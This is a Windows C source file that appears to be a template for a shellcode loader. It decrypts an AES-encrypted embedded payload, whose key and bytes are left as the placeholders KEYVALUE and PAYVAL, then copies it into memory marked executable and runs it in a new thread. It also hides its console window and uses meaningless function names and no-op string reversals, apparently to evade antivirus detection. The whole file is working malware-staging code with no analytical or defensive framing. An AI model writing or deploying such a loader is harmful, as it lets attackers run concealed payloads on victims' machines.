#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <string.h>
#include <tlhelp32.h>


int Random1(char * different, unsigned int different_len, char * Random2, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)Random2, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, different, &different_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
	
	void * exec_mem;
	BOOL rv;
	HANDLE th;
        DWORD oldprotect = 0;
	
	
	char Random2[] = KEYVALUE
	unsigned char Random3[] = PAYVAL
	unsigned int calc_len = sizeof(Random3);

	int pid = 0;
        HANDLE hProc = NULL;	
	strrev(Random3);
	FreeConsole();
	strrev(Random3);

	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	
	Random1((char *) Random3, calc_len, Random2, sizeof(Random2));
	
	RtlMoveMemory(exec_mem, Random3, calc_len);
	
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);


	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}
	
	return 0;
}
	
